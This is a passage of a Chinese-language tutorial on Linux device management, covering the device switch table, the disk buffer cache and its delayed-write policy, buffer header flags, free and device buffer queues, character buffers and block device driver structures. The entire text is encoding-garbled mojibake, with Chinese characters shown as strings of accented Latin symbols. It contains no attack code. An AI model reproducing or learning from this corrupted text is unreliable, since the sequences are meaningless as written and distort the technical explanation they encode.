¹æ®æ–‡ä»¶ç±»å‹è½¬å…¥å—è®¾å¤‡å¼€å…³è¡¨æˆ–å­—ç¬¦è®¾å¤‡å¼€å…³è¡¨è¿›è¡Œæ‰“å¼€ã€å…³é—­å—è®¾å¤‡æˆ–å­—ç¬¦è®¾å¤‡çš„æ“ä½œã€‚å­—ç¬¦è®¾å¤‡ç‰¹æ®Šæ–‡ä»¶çš„ç³»ç»Ÿè°ƒç”¨ readã€write ç³»ç»Ÿè°ƒç”¨åˆ™é€šè¿‡é«˜é€Ÿç¼“å†²æ¨¡å—è½¬å‘è®¾å¤‡é©±åŠ¨æ¨¡å—ä¸­çš„ç­–ç•¥è¿‡ç¨‹ã€‚ ![å›¾ç‰‡æè¿°](c-Linux è®¾å¤‡ç®¡ç†/1.png) 0x03 è®¾å¤‡å¼€å…³è¡¨ Linux ç³»ç»Ÿå§å—è®¾å¤‡å’Œå­—ç¬¦è®¾å¤‡åˆåˆ†åˆ«ç»†åˆ†ä¸ºè‹¥å¹²ç±»ã€‚å¦‚å—è®¾å¤‡å¯åˆ†ä¸ºç¡¬ç›˜ã€è½¯ç›˜ã€ç£å¸¦ã€å…‰ç›˜ç­‰ï¼Œå­—ç¬¦è®¾å¤‡å¯åˆ†ä¸ºç»ˆç«¯è®¾å¤‡ã€æ‰“å°æœºç­‰ã€‚ä¸ºæŒ‡å®šä¸€ç±»è®¾å¤‡ï¼Œå°†è®¾å¤‡ç±»ä» 0 å¼€å§‹é¡ºåºç¼–å·ï¼Œç§°ä¸ºä¸»è®¾å¤‡å·ï¼›åŒä¸€ç±»çš„è®¾å¤‡å¯èƒ½æœ‰è®¸å¤šï¼Œä¸ºäº†æŒ‡å®šä¸€å°å…·ä½“è®¾å¤‡ï¼Œéœ€è¦ä¸€ä¸ªæ¬¡è®¾å¤‡å·æ¥æ ‡è¯†ã€‚å› æ­¤ï¼Œåœ¨æŒ‡å®šä¸€å°å…·ä½“è®¾å¤‡æ—¶è¦ç»™å‡ºå—è®¾å¤‡/å­—ç¬¦è®¾å¤‡ã€ä¸»è®¾å¤‡å·ã€æ¬¡è®¾å¤‡å·ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º: ![å›¾ç‰‡æè¿°](c-Linux è®¾å¤‡ç®¡ç†/2.png) è®¾å¤‡å¼€å…³è¡¨ç›¸å½“äºä¸€ä¸ªäºŒç»´çŸ©é˜µï¼Œæ¯ä¸€è¡Œå«æœ‰åŒä¸€ç±»è®¾å¤‡çš„é©±åŠ¨ç¨‹åºå…¥å£åœ°å€ï¼Œä¸»è®¾å¤‡å·ä¸è¡Œå·ä¸€ä¸€å¯¹åº”ï¼›æ¯ä¸€åˆ—æ˜¯å®Œå…¨ä¸åŒæ“ä½œï¼ˆopenã€closeã€readã€writeï¼‰çš„é©±åŠ¨ç¨‹åºå…¥å£åœ°å€ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](c-Linux è®¾å¤‡ç®¡ç†/3.png) 0x04 ç£ç›˜é«˜é€Ÿç¼“å­˜è¯»å†™ç­–ç•¥ å¯¹æ–‡ä»¶ç³»ç»Ÿçš„ä¸€åˆ‡å­˜å–æ“ä½œéƒ½èƒ½é€šè¿‡ç›´æ¥ä»ç£ç›˜ä¸Šè¯»æˆ–å†™æ¥å®ç°ï¼Œå½“ç£ç›˜ I/O çš„é€Ÿåº¦è¾ƒæ…¢ï¼Œç³»ç»Ÿæ€§èƒ½è¾ƒä½ã€‚ä¸ºäº†å‡å°‘å¯¹ç£ç›˜çš„å­˜å–é¢‘ç‡ï¼ŒLinux ä½¿ç”¨äº†ç£ç›˜é«˜é€Ÿç¼“å­˜æŠ€æœ¯ã€‚ Linux ç£ç›˜ç¼“å†²ç®¡ç†ç­–ç•¥è¯•å›¾æŠŠå°½å¯èƒ½å¤šçš„æœ‰ç”¨æ•°æ®ä¿å­˜åœ¨ç¼“å†²åŒºä¸­ï¼Œç£ç›˜ç¼“å†²ç®¡ç†æ¨¡å—ä½äºæ–‡ä»¶ç³»ç»Ÿå’Œå—è®¾å¤‡é©±åŠ¨ç¨‹åºä¹‹é—´ã€‚å½“ä»ç£ç›˜ä¸­è¯»æ•°æ®æ—¶ï¼Œæ–‡ä»¶ç³»ç»Ÿå…ˆä»ç£ç›˜é«˜é€Ÿç¼“å­˜ä¸­è¯»ï¼Œå¦‚æœæ•°æ®å·²åœ¨é«˜é€Ÿç¼“å­˜ä¸­ï¼Œåˆ™ä¸å¿…å¯åŠ¨ç£ç›˜ I/O ï¼Œå¦‚æœæ•°æ®ä¸å†é«˜é€Ÿç¼“å­˜ä¸­ï¼Œåˆ™å¯åŠ¨ç£ç›˜ I/O ï¼Œä»ç£ç›˜è¯»å–æ•°æ®é€å¾€é«˜é€Ÿç¼“å­˜ï¼Œè¿›ç¨‹å†å†²é«˜é€Ÿç¼“å­˜ä¸­è¯»å–æ•°æ®ã€‚ å½“è¿›ç¨‹å‘ç£ç›˜ä¸Šå†™æ•°æ®æ—¶ï¼Œå…ˆå¾€é«˜é€Ÿç¼“å­˜ä¸­å†™æ•°æ®ï¼Œä»¥ä¾¿éšåè¯»å–å®ƒæ—¶èƒ½å¤Ÿç›´æ¥ä»é«˜é€Ÿç¼“å­˜ä¸Šè¯»å–è€Œä¸éœ€è¦å¯åŠ¨ç£ç›˜è¯»å†™ã€‚Linux é‡‡ç”¨â€œå»¶æ—¶å†™â€ç­–ç•¥ï¼Œå³å¦‚æœç¼“å­˜åŒºè¿˜æ²¡æœ‰å†™æ»¡è¿™ä¸ä¼šæ€¥äºå°†ç¼“å†²åŒºä¸­çš„æ•°æ®å†™åˆ°ç£ç›˜ä¸Šï¼Œè€Œæ˜¯åœ¨ç¼“å†²ç®¡ç†æ•°æ®ç»“æ„ä¸­å¯¹è¯¥ç¼“å†²åŒºè®¾ç½®å»¶è¿Ÿå†™æ ‡å¿—ï¼Œå½“é«˜é€Ÿç¼“å­˜ä¸­çš„æ•°æ®å»¶è¿Ÿåˆ°å¿…é¡»å‘ç£ç›˜ä¸Šå†™çš„æ—¶å€™å†è¿›è¡Œå†™ç£ç›˜æ“ä½œã€‚ 0x05 ç£ç›˜ç¼“å†²ç®¡ç†çš„æ•°æ®ç»“æ„ Linux ä½¿ç”¨å¤šä¸ªå†…å­˜ç¼“å†²åŒºè¿›è¡Œç£ç›˜ç¼“å†²ï¼Œä¸ºäº†åˆç†æœ‰æ•ˆåœ°ç®¡ç†å’Œä½¿ç”¨è¿™äº›ç¼“å†²åŒºï¼Œå¿…é¡»æŒ‰ç…§ä¸€å®šç­–ç•¥è¿›è¡Œç®¡ç†ã€‚ç®¡ç†çš„ä¾æ®æ˜¯ç¼“å†²åŒºçš„ç›¸å…³ä¿¡æ¯ï¼Œä¸ºäº†èƒ½è®¿é—®è¿™äº›ä¿¡æ¯ï¼Œå¿…é¡»å°†å…¶æŒ‰ä¸€å®šæ•°æ®ç»“æ„è¿›è¡Œç»„ç»‡ã€‚ é¦–å…ˆï¼Œç»™æ¯ä¸ªç¼“å†²åŒºå»ºç«‹â€œç¼“å†²é¦–éƒ¨â€æ¥å­˜æ”¾è¯¥ç¼“å†²åŒºçš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ ![å›¾ç‰‡æè¿°](c-Linux è®¾å¤‡ç®¡ç†/4.png) å…¶ä¸­å†…å®¹æœ‰ï¼š è®¾å¤‡å· devï¼šç¼“å†²åŒºå†…åŒ…å«çš„ä¿¡æ¯æ‰€å±è®¾å¤‡çš„è®¾å¤‡å· å—å· blknoï¼šè¯¥ç¼“å†²åŒºå¯¹åº”çš„ç£ç›˜çš„ç‰©ç†å—å· çŠ¶æ€ flagï¼šæè¿°äº†ç¼“å†²åŒºçš„å½“çŠ¶æ€ï¼ŒåŒ…æ‹¬ï¼š - å¿™æ ‡å¿— BUSYï¼šç¼“å†²åŒºå½“å‰æ˜¯å¦æ­£å¿™ - æœ‰æ•ˆä½ AVEï¼šç¼“å†²åŒºåŒ…å«çš„æ•°æ®æ˜¯å¦æœ‰æ•ˆ - å»¶è¿Ÿå†™ä½ DELWRï¼šæ˜¯å¦å»¶è¿Ÿå†™ - å†™æ ‡å¿—ä½ WRITEï¼šæ˜¯å¦æ­£åœ¨æŠŠç¼“å†²åŒºçš„å†…å®¹å†™åˆ°ç£ç›˜ä¸Š - è¯»æ ‡å¿—ä½ READï¼šæ˜¯å¦ä»ç£ç›˜å¾€ç¼“å†²åŒºè¯»å–æ•°æ®ä¿¡æ¯ - ç­‰å¾…ä½ WAITï¼šæ˜¯å¦æœ‰ä¸€ä¸ªè¿›ç¨‹æ­£åœ¨ç­‰å¾…è¯¥ç¼“å†²åŒº - è®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—å‰å‘æŒ‡é’ˆ b-forw - è®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—åå‘æŒ‡é’ˆ b-back - ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—å‰å‘æŒ‡é’ˆ av-forw - ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—åå‘æŒ‡é’ˆ av-back è¦å¯¹æ‰€æœ‰ç¼“å†²åŒºè¿›è¡Œç®¡ç†ï¼Œå¿…é¡»å°†æ‰€æœ‰ç¼“å†²åŒºé¦–éƒ¨ç»„ç»‡æˆä¸€å®šçš„æ•°æ®ç»“æ„ï¼Œ Linux å»ºç«‹äº†ä¸¤ä¸ªç¼“å†²åŒºé˜Ÿåˆ—ï¼›ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—å’Œè®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—ã€‚ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](c-Linux è®¾å¤‡ç®¡ç†/5.png) ä¸ºäº†å¯¹ç¼“å†²åŒºè¿›è¡Œåˆ†é…ï¼ŒæŠŠæ‰€æœ‰ç©ºé—²ç¼“å†²åŒºç»„ç»‡æˆä¸€ä¸ªé˜Ÿåˆ—ï¼Œé˜Ÿåˆ—ä¸­çš„æ‰€æœ‰ç¼“å†²åŒºçš„å¿™æ ‡å¿—ä½ BUSY å‡ä¸º 0 ã€‚è¯¥é˜Ÿåˆ—æ˜¯ä¸€ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ã€‚ å¯¹äºæ¯ç±»è®¾å¤‡éƒ½å»ºç«‹ä¸€ä¸ªè®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—ï¼Œç”±ä¸è¯¥ç±»è®¾å¤‡æœ‰å…³çš„æ‰€æœ‰ç¼“å†²åŒºæ„æˆã€‚æ­¤é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰ç¼“å†²åŒºé¦–éƒ¨çš„å¿™æ ‡å¿—ä½ BUSY å‡ä¸º 1 ã€‚è¯¥é˜Ÿåˆ—åŒæ ·æ˜¯ä¸€ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ã€‚ ä»»ä½•ç¼“å†²åŒºé¦–éƒ¨ä¸æ˜¯ä½äºç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—ä¸­å°±æ˜¯ä½äºè®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—ä¸­ã€‚è®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](c-Linux è®¾å¤‡ç®¡ç†/6.png) 0x06 Linux ç£ç›˜ç¼“å†²åŒºç®¡ç†ç®—æ³• Linux æä¾›çš„ç£ç›˜é«˜é€Ÿç¼“å†²åŒºä¸å±äºä»»ä½•è¿›ç¨‹ä¸“ç”¨ï¼Œè€Œæ˜¯ç”±å¤šä¸ªè¿›ç¨‹å…±äº«ï¼Œç”±æ“ä½œç³»ç»Ÿè¿›è¡Œç»Ÿä¸€ç®¡ç†ã€‚ä¸ºäº†æé«˜ä½¿ç”¨æ•ˆç‡ï¼Œå¿…é¡»é‡‡å–é€‚å½“çš„ç®¡ç†ç­–ç•¥ã€‚ å½“æŸè¿›ç¨‹è¦ä»ä¸€ä¸ªç£ç›˜è¯»å–æ•°æ®æ—¶ï¼Œé¦–å…ˆéœ€è¦æ£€æŸ¥è¦è¯»å–æ•°æ®çš„ç£ç›˜å—æ˜¯å¦åŒ…å«åœ¨æŸç¼“å†²åŒºä¸­ï¼Œå¦‚æœä¸åœ¨ï¼Œåˆ™ä»ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—ä¸­åˆ†é…ç»™å®ƒä¸€ä¸ªç©ºé—²ç¼“å†²åŒºï¼›å½“æŸè¿›ç¨‹è¦å°†æ•°æ®å†™å…¥ç£ç›˜æ—¶ï¼Œé¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹è¦å†™çš„ç£ç›˜å—æ˜¯å¦åœ¨æŸç¼“å†²åŒºä¸­ï¼Œå¦‚æœä¸åœ¨åˆ™ä¸ºè¿™ä¸ªç£ç›˜å—åˆ†é…ä¸€ä¸ªç©ºé—²ç¼“å†²åŒºï¼Œè¢«åˆ†é…çš„ç©ºé—²ç¼“å†²åŒºä»ç©ºé—²ç¼“å†²é˜Ÿåˆ—ä¸­é€€å‡ºå¹¶è¿›å…¥å¯¹åº”çš„è®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—ï¼Œè¯¥ç¼“å†²åŒºçš„ BUSY æ ‡å¿—ä½ç½®ä¸€ã€‚ å½“ç¼“å†²åŒºçš„ä¿¡æ¯è¯»åˆ°ç›¸åº”è¿›ç¨‹çš„å†…å­˜åŒºåï¼Œæˆ–è¿›ç¨‹ä¿¡æ¯å†™åˆ°ç¼“å†²åŒºåï¼Œï¼Œä½¿é‡Šæ”¾è¿›ç¨‹ä½¿ç”¨çš„ç¼“å†²åŒºï¼Œå°† flag ä¸­çš„ BUSY æ ‡å¿—ä½æ¸…é›¶å¹¶é€å…¥ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—å°¾éƒ¨ï¼Œå³å°†ç½®ä¸ºå»¶è¿Ÿå†™çš„ç¼“å†²åŒºä¹Ÿé€å…¥ç©ºé—²ç¼“å†²é˜Ÿåˆ—ï¼Œè¿™æ ·å¯ä»¥ä½¿å¾—æœ‰é™çš„ç¼“å†²åŒºå¾—åˆ°å……åˆ†åˆ©ç”¨ï¼Œæ»¡è¶³å¤šä¸ªå¹¶å‘è¿›ç¨‹çš„éœ€æ±‚ã€‚ å½“ä¸€ä¸ªç¼“å†²åŒºè¢«é€å¾€ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—å°¾éƒ¨æ—¶ï¼Œå¹¶ä¸é€€å‡ºè®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—ï¼Œè€Œæ˜¯ä»ç„¶ç•™åœ¨åŸé˜Ÿåˆ—ä¸­ï¼Œè¿™æ ·ä½¿å¾—æ­¤æ¬¡ä½¿ç”¨å®Œæ¯•é€å¾€ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—çš„ç¼“å†²åŒºèƒ½å¤Ÿæš‚æ—¶ä¿å­˜æœ€åçš„ä¿¡æ¯åº”å¯¹å¯èƒ½çš„è®¿é—®ã€‚å¦‚æœå°†å…¶ä¿ç•™åœ¨è®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—ä¸­ï¼Œå½“åæ¥è¦è¯»å–çš„ç£ç›˜æ•°æ®ä»ç„¶ä¿ç•™åœ¨æ­¤ç¼“å†²åŒºä¸­æ—¶å¯ä»¥ç›´æ¥ä»ç¼“å†²åŒºä¸­è¯»å–è€Œä¸éœ€è¦å†æ¬¡å¯åŠ¨ç£ç›˜ I/O ï¼Œæé«˜äº†è¯»ç›˜é€Ÿåº¦ï¼Œè¿™æ­£æ˜¯ä½¿ç”¨é«˜é€Ÿç£ç›˜ç¼“å­˜çš„ç›®çš„ã€‚ å¦‚æœè¦ä½¿å¾—ä½¿ç”¨å®Œæ¯•é€å…¥ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—çš„ç¼“å†²åŒºé‡æ–°åˆ†é…ç»™å…¶ä»–è®¾å¤‡ï¼Œåˆ™å¯ä»¥å°†è¯¥ç¼“å†²åŒºåŒæ—¶ä»ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—å’ŒåŸè®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—ä¸­æŠ½å‡ºï¼Œé€å…¥æ–°çš„è®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—ã€‚ å› ä¸ºè¢«ä½¿ç”¨è¿‡çš„ç¼“å†²åŒºæ”¾åœ¨ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—çš„æœ«å°¾ï¼Œéšç€ä¸æ–­åœ°ä»ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—ä¸Šå–ä¸‹ç¼“å†²åŒºï¼Œåé¢çš„ç¼“å†²åŒºä¼šä¸æ–­åœ°å‘é˜Ÿåˆ—é¦–éƒ¨ç§»åŠ¨ã€‚å¦‚æœä¸€ä¸ªå»¶è¿Ÿå†™æ ‡å¿—ä½ä¸º 1 çš„ç¼“å†²åŒºç§»åŠ¨åˆ°äº†ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—çš„å¤´éƒ¨ï¼Œå½“å…¶è¢«é‡æ–°åˆ†é…ä¹‹å‰ï¼Œéœ€è¦å°†å†…éƒ¨çš„å†…å®¹å†™å…¥åˆ°ç›¸åº”è®¾å¤‡æŒ‡å®šçš„ç£ç›˜å—ä¸­ã€‚ 0x07 å­—ç¬¦ç¼“å†²åŒºåŠå…¶é˜Ÿåˆ— Linux ä¸­ä¸ºå­—ç¬¦è®¾å¤‡çš„æ•°æ®ä¼ è¾“è®¾ç½®äº†ä¸€ä¸ªå…¬ç”¨çš„å­—ç¬¦ç¼“å†²æ± ï¼Œè¯¥ç¼“å†²æ± å†…åŒ…å«æœ‰è‹¥å¹²ä¸ªç¼“å†²åŒºï¼Œä½†æ˜¯æ¯ä¸ªç¼“å†²åŒºå¾ˆå°ï¼Œä»…æœ‰å‡ ä¸ªåˆ°å‡ åå­—èŠ‚ã€‚ä¸ºäº†åˆç†ä½¿ç”¨è¿™äº›ç¼“å†²åŒºï¼Œå°†å…¶ç»„ç»‡æˆä¸€å®šçš„æ•°æ®ç»“æ„ã€‚åŒå—è®¾å¤‡ç¼“å†²åŒºçš„ç®¡ç†ç±»ä¼¼ï¼Œå»ºç«‹ç©ºé—²å­—ç¬¦ç¼“å†²åŒºé˜Ÿåˆ—å’Œè®¾å¤‡å­—ç¬¦ç¼“å†²åŒºé˜Ÿåˆ—ã€‚ æ¯ä¸ªå­—ç¬¦ç¼“å†²åŒºç”±å››éƒ¨åˆ†ç»„æˆï¼š ç¼“å†²åŒºçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä½ç½® ç¼“å†²å™¨çš„æœ€åä¸€ä¸ªå­—ç¬¦ä½ç½® æŒ‡å‘ä¸‹ä¸€ä¸ªå­—ç¬¦ç¼“å†²åŒºçš„æŒ‡é’ˆ å­—ç¬¦ç¼“å†²åŒº å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](c-Linux è®¾å¤‡ç®¡ç†/7.png) å¯¹å­—ç¬¦ç©ºé—²åŒºçš„æ“ä½œæ˜¯æ¯æ¬¡é€å…¥ä¸€ä¸ªå­—ç¬¦æˆ–å–å‡ºä¸€ä¸ªå­—ç¬¦ã€‚é€å…¥å­—ç¬¦å†å­—ç¬¦ç¼“å†²åŒºçš„å°¾éƒ¨è¿›è¡Œï¼›å–å‡ºå­—ç¬¦ä»å­—ç¬¦ç¼“å†²åŒºçš„å¤´éƒ¨è¿›è¡Œã€‚éšç€ä¸æ–­å¾€å­—ç¬¦ç¼“å†²åŒºä¸­æ”¾å…¥å­—ç¬¦ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦çš„ä½ç½®ä¼šå‘åæ¨ç§»ï¼Œç›´åˆ°å­—ç¬¦ç¼“å†²åŒºçš„æœ«å°¾ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®ä¸ä¸€å®šæ˜¯å­—ç¬¦ç¼“å†²åŒºçš„å¼€å§‹ä½ç½®ï¼Œéšç€ä¸æ–­åœ°ä»ç¼“å†²åŒºä¸­å–å‡ºå­—ç¬¦ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®ä¸æ–­åç§»ç›´åˆ°å­—ç¬¦ç¼“å†²åŒºçš„æœ«å°¾ã€‚ 0x08 ç©ºé—²ç¼“å†²åŒºçš„åˆ†é…ä¸å›æ”¶ åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨å­—ç¬¦è®¾å¤‡è¿›è¡Œ I/O æ“ä½œæ—¶ï¼Œæ–‡ä»¶ç³»ç»Ÿä¼šä¸ºè¯¥å­—ç¬¦è®¾å¤‡åˆ†é…ä¸€ä¸ªç©ºé—²ç¼“å†²åŒºã€‚åˆ†é…æ—¶ä¼šæ£€æŸ¥ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—ï¼Œå½“é˜Ÿåˆ—éç©ºæ—¶åˆ™ç›´æ¥ä»é˜Ÿåˆ—é¦–éƒ¨å–å‡ºä¸€ä¸ªç©ºé—²ç¼“å†²åŒºåˆ†é…ç»™è¿™ä¸ªå­—ç¬¦è®¾å¤‡å¹¶å°†å…¶é€å…¥è¯¥å­—ç¬¦è®¾å¤‡çš„è®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—ï¼Œå¹¶å°†æŒ‡å‘è¯¥ç¼“å†²åŒºçš„æŒ‡é’ˆè¿”å›ç»™è°ƒç”¨è¿›ç¨‹ï¼›å½“ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼Œåˆ™è¯·æ±‚ I/O æ“ä½œçš„è¿›ç¨‹å°†è¢«é˜»å¡ç­‰å¾…ç›´åˆ°æœ‰ç©ºé—²ç¼“å†²åŒºå¯ç”¨ã€‚ å½“å­—ç¬¦ç¼“å†²åŒºä¸­çš„æ•°æ®è¢«æå–å®Œæ¯•åï¼Œä¾¿è¦é‡Šæ”¾è¯¥ç¼“å†²åŒºï¼Œå°†è¯¥ç¼“å†²åŒºé€å…¥ç©ºé—²å­—ç¬¦ç¼“å†²åŒºé˜Ÿåˆ—çš„é¦–éƒ¨ã€‚è‹¥æ­¤æ—¶æœ‰ç”³è¯·ç©ºé—²ç¼“å†²åŒºè€Œé˜»å¡çš„è¿›ç¨‹åˆ™ä¼šå”¤é†’è¯¥è¿›ç¨‹ã€‚ 0x09 Linux çš„è®¾å¤‡é©±åŠ¨ è®¾å¤‡é©±åŠ¨æ˜¯æŒ‡æ§åˆ¶å…·ä½“çš„ç‰©ç†è®¾å¤‡å®Œæˆ I/O æ“ä½œï¼Œä¸ç¡¬ä»¶çš„ç‰©ç†ç‰¹æ€§å’Œæ•°æ®ä¼ è¾“æ§åˆ¶æ–¹å¼å¯†åˆ‡ç›¸å…³ï¼Œä¸åŒç±»å‹çš„è®¾å¤‡ã€ä¸åŒæ•°æ®ä¼ è¾“æ§åˆ¶æ–¹å¼è¦é‡‡ç”¨ä¸åŒè®¾å¤‡é©±åŠ¨æ–¹å¼ã€‚ Linux é¦–å…ˆæŠŠè®¾å¤‡åˆ†ä¸ºå—è®¾å¤‡ã€å­—ç¬¦è®¾å¤‡ä¸¤å¤§ç±»ï¼Œç„¶åå†å¯¹å—è®¾å¤‡å’Œå­—ç¬¦è®¾å¤‡å…·ä½“åˆ†ç±»ï¼Œé’ˆå¯¹æ¯ä¸€ç±»è®¾å¤‡åˆ†åˆ«å¼€å‘ä¸åŒçš„è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚ 0x0a å—è®¾å¤‡é©±åŠ¨ æ•°æ®ç»“æ„ å—è®¾å¤‡è¡¨ï¼Œå¯¹æ¯ä¸€ç±»å—è®¾å¤‡åˆ†åˆ«è®¾ç½®å—è®¾å¤‡è¡¨ï¼Œè®°å½•è¯¥ç±»è®¾å¤‡çš„ç›¸å…³ä¿¡æ¯ã€‚å…¶å†…å®¹åŒ…æ‹¬ï¼š å¿™æ ‡å¿—ï¼šæ ‡å¿—è®¾å¤‡çš„å¿™é—²çŠ¶æ€ï¼Œ0 è¡¨ç¤ºç©ºé—²ï¼Œ1 è¡¨ç¤ºæ­£å¿™ã€‚ å‡ºé”™æ¬¡æ•°ï¼šæŒ‡è®¾å¤‡ I/O å‡ºé”™æ¬¡æ•°ã€‚æ¯æ¬¡ I/O å®Œæˆåï¼Œå°±è½¬å…¥è®¾å¤‡ä¸­æ–­å¤„ç†ç¨‹åºï¼Œè®¾å¤‡ä¸­æ–­å¤„ç†ç¨‹åºæ£€æµ‹æ­¤æ¬¡ I/O è¿‡ç¨‹æ˜¯å¦å‡ºé”™ï¼Œå¦‚æœå‡ºé”™åˆ™å°†å‡ºé”™æ¬¡æ•°åŠ ä¸€ï¼Œå¦‚æœå‡ºé”™æ¬¡æ•°æ²¡ç”¨è¶…è¿‡è§„å®šå€¼åˆ™ä¸­æ–­å¤„ç†ç¨‹åºé‡æ–°å¯åŠ¨ä¸€æ¬¡æ•°æ®ä¼ è¾“ï¼›å¦‚æœå‡ºé”™æ¬¡æ•°è¶…å‡ºè§„å®šå€¼åˆ™è®¤ä¸ºæ˜¯çœŸæ­£çš„æ•°æ®ä¼ è¾“é”™è¯¯ï¼Œä¸ä¼šå†é‡æ–°å¯åŠ¨æ•°æ®ä¼ è¾“ã€‚ è®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—å¤´æŒ‡é’ˆï¼šåˆ†é…ç»™è¯¥è®¾å¤‡çš„ç¼“å†²åŒºé˜Ÿåˆ—çš„å¤´æŒ‡é’ˆ è®¾å¤‡ç¼“å†²åŒºé˜Ÿåˆ—å°¾æŒ‡é’ˆï¼šåˆ†é…ç»™è¯¥è®¾å¤‡çš„ç¼“å†²åŒºé˜Ÿåˆ—çš„å°¾æŒ‡é’ˆ I/O è¯·æ±‚é˜Ÿåˆ—å¤´æŒ‡é’ˆï¼šè¯·æ±‚è¯¥ç±»è®¾å¤‡ I/O æ“ä½œçš„è¯·æ±‚å—ç»„æˆçš„é˜Ÿåˆ—çš„å¤´æŒ‡é’ˆ I/O è¯·æ±‚é˜Ÿåˆ—å°¾æŒ‡é’ˆï¼šè¯·æ±‚è¯¥ç±»è®¾å¤‡ I/O æ“ä½œçš„è¯·æ±‚å—ç»„æˆçš„é˜Ÿåˆ—çš„å°¾æŒ‡é’ˆ I/O è¯·æ±‚é˜Ÿåˆ—ã€‚ç”¨æˆ·è¿›ç¨‹çš„ I/O è¯·æ±‚åŒ…æ‹¬è¦æ±‚å®Œæˆ I/O æ“ä½œçš„é€»è¾‘è®¾å¤‡åã€è¦æ±‚çš„æ“ä½œã€ä¼ é€æ•°æ®åœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€ã€ä¼ é€æ•°æ®çš„é•¿åº¦ï¼Œå°†è¿™äº›ä¿¡æ¯ç»„ç»‡æˆ I/O è¯·æ±‚å— iorbã€‚é€»è¾‘è®¾å¤‡åç›¸åŒï¼ˆåŒä¸€ç±»è®¾å¤‡ï¼‰çš„ I/O è¯·æ±‚å—æ„æˆä¸€ä¸ªé˜Ÿåˆ—ï¼Œç§°ä¸º I/O è¯·æ±‚é˜Ÿåˆ—ã€‚æ¯ä¸€ç±»è®¾å¤‡éƒ½åˆ†åˆ«æœ‰ä¸€ä¸ª I/O è¯·æ±‚é˜Ÿåˆ—ã€‚ ç£ç›˜è®¾å¤‡é©±åŠ¨ç¨‹åº é©±åŠ¨ç¨‹åºæ§åˆ¶è®¾å¤‡å…·ä½“å®ç°è¿›ç¨‹çš„é«˜çº§ I/O è¯·æ±‚åŒ…æ‹¬æ‰“å¼€ã€å…³é—­ã€è¯»ã€å†™ç­‰ã€‚ æ‰“å¼€ã€‚ç£ç›˜åœ¨ä½¿ç”¨ä¹‹å‰å¿…é¡»è¿›è¡Œæ‰“å¼€æ“ä½œï¼Œå…¶ç›®çš„æ˜¯åœ¨ä½¿ç”¨ç£ç›˜ä¹‹å‰è¿›è¡Œå¿…è¦çš„åˆå§‹åŒ–â€”â€”â€”â€”è®¾ç½®ç¡¬ç›˜çš„å·¥ä½œå‚æ•°ï¼Œç¡¬ç›˜å·¥ä½œå‚æ•°å­˜æ”¾åœ¨ä¸»å­˜ä¸­æ“ä½œç³»ç»Ÿç»“æ„ç¡¬ç›˜æ§åˆ¶å—ä¸­ï¼Œå®ƒæ˜¯é©±åŠ¨ç¨‹åºå¯¹ç¡¬ç›˜è¿›è¡Œæ§åˆ¶çš„ä¾æ®ã€‚ç¡¬ç›˜å·¥ä½œå‚æ•°å­˜æ”¾åœ¨ç¡¬ç›˜çš„å¼•å¯¼åŒºä¸­ï¼Œå› æ­¤è¦å°†å¼•å¯¼åŒºå†…å®¹è¯»åˆ°ç¡¬ç›˜æ§åˆ¶å—ä¸­å¿…é¡»è¿›è¡Œéƒ¨åˆ†åˆå§‹åŒ–å·¥ä½œã€‚ è¯»å†™ç¡¬ç›˜ã€‚ç”±ç­–ç•¥æ¥å£ç¨‹åº strategy å®Œæˆï¼Œæ¯æ¬¡åªè¯»å†™ä¸€ä¸ªæ‰‡åŒºï¼ŒLinux ä¸­å¯¹ç¡¬ç›˜æœ‰ä¸¤ç§è¯»æ–¹å¼å’Œä¸‰ç§å†™æ–¹å¼ï¼š - 